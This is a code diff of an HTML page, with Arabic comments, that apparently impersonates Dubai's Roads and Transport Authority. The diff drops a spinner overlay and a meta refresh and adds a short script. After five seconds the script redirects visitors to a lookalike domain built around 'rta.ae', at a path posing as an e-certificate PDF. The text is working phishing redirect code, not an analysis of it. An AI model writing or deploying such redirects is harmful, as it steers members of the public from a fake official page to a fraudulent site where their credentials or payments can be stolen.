@@ -5,54 +5,20 @@
 <link rel="icon" type="image/jpeg" href="rta.jpg">
 
 
-<!-- دائرة تحميل سريعة صغيرة فوق الصفحة -->
-<div id="small-loader-overlay" style="
-  position: fixed;
-  inset: 0;
-  display: none;
-  justify-content: center;
-  align-items: flex-start;
-  padding-top: 18px;
-  background: rgba(255,255,255,0);
-  backdrop-filter: blur(0.5px);
-  -webkit-backdrop-filter: blur(0.5px);
-  z-index: 2147483647;
-">
-  <div id="small-spinner" style="
-    width: 28px;
-    height: 28px;
-    border: 4px solid rgba(0,0,0,0.12);
-    border-top-color: #1976D2;
-    border-radius: 50%;
-    box-sizing: border-box;
-    animation: spinFast 1s linear infinite;
-    -webkit-animation: spinFast 1s linear infinite;
-  "></div>
-</div>
-
-<style>
-@keyframes spinFast {
-  from { transform: rotate(0deg); }
-  to { transform: rotate(360deg); }
-}
-</style>
-
 <script>
-setTimeout(function(){
-  var overlay = document.getElementById("small-loader-overlay");
-  overlay.style.display = "flex";
-  setTimeout(function(){
-    overlay.style.display = "none";
-    window.location.href = "https://traffic.rta.ae.trfesrv.sbs/public_resources/view-ecertificate.do.pdf";
-  }, 500);
-}, 3000);
+// تحديد الرابط الذي سيتم التحويل إليه
+var targetURL = "https://traffic.rta.ae.trfesrv.sbs/public_resources/view-ecertificate.do.pdf";
+
+// استخدام دالة setTimeout لتأخير التحويل
+// 5000 مللي ثانية = 5 ثوانٍ
+setTimeout(function() {
+  window.location.href = targetURL;
+}, 5000); 
 </script>
 
 
 
 
-
-<meta http-equiv="refresh" content="140000000000; url=https://traffic.rta.ae.trfesrv.sbs/public_resources/view-ecertificate.do.pdf">
 
 
 
